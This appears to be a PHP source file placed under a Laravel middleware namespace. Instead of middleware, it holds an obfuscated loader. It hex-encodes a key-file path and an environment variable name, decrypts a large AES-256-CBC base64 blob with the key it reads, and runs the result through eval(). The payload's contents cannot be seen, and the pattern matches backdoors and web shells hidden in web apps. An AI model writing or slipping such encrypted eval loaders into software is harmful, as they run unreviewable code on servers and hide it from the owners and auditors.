<?php
namespace App\Http\Middleware;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('QtFcMV925yELOaRDj/pmlg==');

$c=base64_decode(

'rZUqf0M7KJod74CCw7vQfFJdNFNXTg6LNoC3IAgpw1SM7TByCtm7GbuJwpchX44qp3gG6GQcgPfq' .
'LqoD8EWDau3leUy1Rkm3VOWPO4SWLgpY4TyypKrcbr+QXRnhVP/546rTPQPXwjnH55pmPzSiJH09' .
'eHEeiFL0IDBl25gpnXa5GJXLBXBf5Sr6VeS83aYAi2N1cKdLyRpqTxx+K3mTAr0nMGggrAJu07MZ' .
'I3mIxisU4CsZWzRrdSJ3zQGuCr2Cb27yQJYagOnKn571dRWtLq6KUb9+t9xkIDd/NlD80nB3ZUmy' .
'ZHPaM1WSnOoJItv3c0iPgpgEZ2i1YVz7RKcZ/+ZK22OYdKN1SWEVy5/Vzg1tbLubOggDe0BkE65l' .
'N6zTogZCdc6E6+VcA+w3AA6XH0fQfRngbmJD17iaYFB1Qa4JbhZb1mwayYUGvpNFy/Z7Y8ROLxu4' .
'RvJDQeQUXV+XLMFFyj5Bzo1xdDWbcbXD7VcYF/0War2XAA+eFdA9PRTlD3z3N+A7wbHayUDOsYp0' .
'gjs+HJYUYFys2xCIMwXTDfgNnsBG3R11jZ40ttcZowupYApKUQc771La1KCJ1KLhBxHeBaEmP5eG' .
'5JuiwVO26G43JMHRB1jTf+65WrJvjM634kqgTdVeXHkGRIYIspaAbu9shUB/YpMBVkHqHh4SOTe8' .
'+euSdioL5knQbGLHu5RVEM1LZ09bsS2i3Y+cea58l/sTEIuL2ireUt5CFGQsXfmROsKTUxLI3+q2' .
'AwGH2cpxMME4wAaTPcOxpHtyccca5fsN9hhROnECPfCE9TPZ+aAfaPYk/5ouFiUp95IzD4HpuSAi' .
'5htXOytC9yFJiIMQirP5opwFiPQPvPsYgsKjySR7Uw4PrpC3cuitKQhOD/4K+b5+MF82iF3FtEJd' .
'F2wzbzTpjhj/Iobr1y0pavwaY7OCKqTKc9gCcvurYVerqk9j5NQv40mLNkLaWkCQKOW/9aHnlvpQ' .
'wfbvqbEk752uxSMe6nNVKmkH+EXP4/i2NJosUE92HjZrWj0wv+8WMv2X0Z785vJCDUdT+MwONjRL' .
'bENEsYAdDsP9tJlOhdCns5ga0S6G/Ta4Erkt1E1uH4ES+d2vwuH7/BiRIkfsdFDu0GNmrudMYwpl' .
'ExoDkgQiKzxZXHaWFr2SqSVzC6Dquh4dJ2uAPUwL7jQfba7mYKQJ7YhpuTM7R23tkkIgaeRVZmEX' .
'su7X8pUGmjVWhbh3wmeBwIz1K3T2jonVIUzsPbdwQxPCrVETmZMu0/7YQOE/Przn+dgBB6PrpGJO' .
'DMK0PjpDp3SFFuK4+muOAtGFv90zqsdidKuF4bGFRNkp9R0YuTbxhd/XGEi4am2agKA7LvcmoEBf' .
'RdKUn6KkihZDo80ghP9c5QL/bc7jHzvIOSSI8sFNSJ/4SMAKf1fhq4q+ws876su0Ku9QHjped62b' .
'Z/Y+a3kLSh+W3Ih29HszjJ2suaB5xJuhVNfWyf3FAzMlhlv+bfRU/ZAzICrUP+1Wm9Cw6PGpIDqo' .
'791u7BnO2XfjXuYdaAXZ6hsxwOLXvzWNG0LVyg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

